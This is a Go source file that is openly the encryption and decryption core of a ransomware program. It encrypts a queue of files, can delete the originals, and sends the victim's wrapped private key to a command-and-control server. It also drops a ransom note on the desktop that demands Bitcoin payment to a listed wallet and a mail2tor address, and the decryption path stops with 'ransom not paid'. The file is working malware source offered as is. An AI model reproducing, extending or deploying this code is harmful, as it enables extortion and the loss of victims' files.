package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"main/src/cli"
	wcc "main/src/crypto"
	"main/src/utils"
	. "main/src/utils"
	"os"
	"path/filepath"
	"sync"
)

func generateClientKey() *rsa.PrivateKey {
	var clientPrivateKey *rsa.PrivateKey
	var err error
	if cli.Settings.SuppliedClientPrivateKey != nil {
		clientPrivateKey = cli.Settings.SuppliedClientPrivateKey
	} else {
		clientPrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			log.Fatal(err)
		}
	}
	return clientPrivateKey
}

func StartEncryption(q *Queue, key string) int {
	var keySendOffSuccessful bool
	var err error
	serverPubKeyBytes, _ := hex.DecodeString(key)
	clientPrivateKey := generateClientKey()
	clientPublicKey := &clientPrivateKey.PublicKey
	encryptedPrivateKeyBytes, err := handleClientKey(serverPubKeyBytes, clientPrivateKey, &keySendOffSuccessful)
	wg := new(sync.WaitGroup)
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.EncryptFile(file, "", clientPublicKey)
			if cli.Settings.Delete {
				os.Remove(file)
			}
		}()
	}
	wg.Wait()
	if !keySendOffSuccessful || err != nil {
		ioutil.WriteFile("./e_key.txt", []byte(encryptedPrivateKeyBytes), 0777)
	}
	if cli.Settings.LeaveNote {
		leaveRansomNote(key)
	}
	return 0
}

func StartDecryption(q *Queue, key string) int {
	var clientPrivateKeyBytes []byte
	if cli.Settings.RawKey {
		rClientPrivateKeyBytes, fe := ioutil.ReadFile("./raw_key.bin")
		if fe != nil {
			log.Fatal(fe.Error())
		}
		clientPrivateKeyBytes = rClientPrivateKeyBytes
	} else {
		var hash []byte
		var err error
		if len(cli.Settings.DecryptionHash) > 0 {
			hash = []byte(cli.Settings.DecryptionHash)
		} else {
			hash, err = ioutil.ReadFile("./decryption_hash.bin")
			if err != nil {
				log.Fatal("Failed to read the hash for key retrival")
			}
		}
		keyHex, err := RetriveKeyByHash(string(hash), cli.Settings.OfflineMode)
		if err != nil {
			if err.Error() == "ransom not paid" {
				fmt.Println("The ransom is currently not paid. If you made the payment there could be some processing delays so patience is adviced")
				log.Fatal("Ransom not paid")
			} else if err.Error() == "failed to contact CnC server" {
				fmt.Println("Failed to contact the server. Running in offline mode")
				keyHexBytes, err := ioutil.ReadFile("./d_key.txt")
				if err != nil {
					fmt.Println("Failed to contact the server. No local 'd_key.bin key found'. Decryption not possible")
					log.Fatal("Failed to preform offline decryption: missing decrypted AES file")
				}
				keyHex = string(keyHexBytes)
			} else {
				log.Fatal("Unexpected error occurred in key retrieval process")
			}
		}
		clientPrivateKeyBytes, _ = hex.DecodeString(keyHex)
	}
	clientPrivateKey, err := x509.ParsePKCS1PrivateKey(clientPrivateKeyBytes)
	if err != nil {
		log.Fatal(err)
	}
	// fmt.Println(clientPrivateKeyBytes)
	wg := new(sync.WaitGroup)
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.DecryptFile(file, clientPrivateKey)
			if cli.Settings.Delete {
				os.Remove(file)
			}
		}()
	}
	wg.Wait()
	return 0
}

func encryptClientPrivateKeyWithServerPublicKey(clientPrivateKey []byte, publicKeyPemBytes []byte) ([]byte, error) {
	AESKeyBytes := make([]byte, 32)
	rand.Read(AESKeyBytes)
	ct := wcc.Encrypt(clientPrivateKey, AESKeyBytes)
	encryptedKeyHex, err := wcc.EncryptWithRSAPublicKey(AESKeyBytes, string(publicKeyPemBytes))
	if err != nil {
		return nil, errors.New("failed to encrypt private key")
	}
	encryptedKeyBytes, _ := hex.DecodeString(encryptedKeyHex)
	encryptedKey := append(ct, encryptedKeyBytes...)
	return encryptedKey, nil
}

func handleClientKey(pubKeyBytes []byte, clientPrivateKey *rsa.PrivateKey, flag *bool) (string, error) {
	encryptedClientPrivateKey, err := encryptClientPrivateKeyWithServerPublicKey(x509.MarshalPKCS1PrivateKey(clientPrivateKey), pubKeyBytes)
	if err != nil {
		return "", errors.New("Failed to encrypt client private key")
	}
	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
	if cli.Settings.RawKey {
		ioutil.WriteFile("./raw_key.bin", x509.MarshalPKCS1PrivateKey(clientPrivateKey), 0777)
	} else {
		var resp bool
		resp, err = utils.SendOffKey(hex.EncodeToString(encryptedClientPrivateKey), wcc.GetHash(privateKeyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(privateKeyBytes)), 0777)
		if err != nil || !resp {
			log.Println("Failed to contact Command And Control server")
			err = errors.New("failed to contact CnC server")
			*flag = false
		} else {
			*flag = true
		}
	}
	return hex.EncodeToString(encryptedClientPrivateKey), err
}

func leaveRansomNote(key string) {
	var note = `
		You are a victim of ransomware hacker attack!
		Your files have been encrypted by a strong security algorithm. They are NOT comming back. No amount of googling will help you.
		There is only one way to return your files: obtain the key. Only way to get he key is to pay the ransom.
		Pay the ransom to the following Bitcoin address: 178Dg2rMxVF9Ux8TpZbad3SoWoga6qb3N9
		Ransom amount is 500$.
		Send email with TXID (tansaction ID) in the title and HASH in body to nonna@mail2tor.com
		If you've done everything correctly you will receve key and instructions on how to recover the files.
		You don't have much time.
		Hash is: `

	sha := sha1.New()
	sha.Write([]byte(key))
	keyHash := sha.Sum(nil)
	signedNote := note + hex.EncodeToString(keyHash)

	fileName := "READ_ME_NOW.txt"
	filePath := filepath.Join(GetDesktopLocation(), fileName)
	_, err := os.OpenFile(filePath, os.O_CREATE, os.ModeAppend)
	if err != nil {
		filePath = "C:\\" + fileName
	}
	err = ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	if err != nil {
		filePath = fileName
		ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	}
}
